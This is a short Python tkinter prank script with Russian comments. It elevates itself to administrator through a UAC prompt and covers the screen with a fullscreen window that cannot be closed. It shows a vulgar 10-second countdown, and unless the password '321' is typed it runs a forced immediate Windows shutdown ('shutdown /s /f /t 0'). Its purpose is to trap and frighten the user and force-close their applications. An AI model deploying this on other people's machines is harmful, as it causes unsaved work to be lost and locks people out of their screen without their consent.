import tkinter as tk
import os
import sys
import ctypes
import subprocess

# 1. Проверка и запрос прав администратора
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Перезапуск скрипта с правами админа
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# 2. Логика выключения
def shutdown_pc():
    # -s (shutdown), -f (force close apps), -t 0 (instantly)
    os.system("shutdown /s /f /t 0")

def update_timer(seconds):
    if seconds > 0:
        label.config(text=f"СИСТЕМА БУДЕТ ОБОСРОНА ЧЕРЕЗ: {seconds}")
        root.after(1000, update_timer, seconds - 1)
    else:
        shutdown_pc()

# 3. Проверка пароля
def check_password(event=None):
    if entry.get() == "321":
        # Отмена выключения (если успел ввести)
        root.destroy()
        sys.exit()
    else:
        entry.delete(0, tk.END)
        label.config(text="НЕВЕРНЫЙ ПАРОЛЬ! СКОРЕЕ!", fg="red")

# Настройка интерфейса
root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.config(cursor="none", bg="black")
root.protocol("WM_DELETE_WINDOW", lambda: None) # Запрет закрытия

label = tk.Label(root, text="", fg="white", bg="black", font=("Arial", 30))
label.pack(expand=True)

entry = tk.Entry(root, show="*", font=("Arial", 24), justify='center')
entry.pack(pady=20)
entry.focus_set()

root.bind('<Return>', check_password)

# Запуск таймера на 10 секунд
update_timer(10)

root.mainloop()
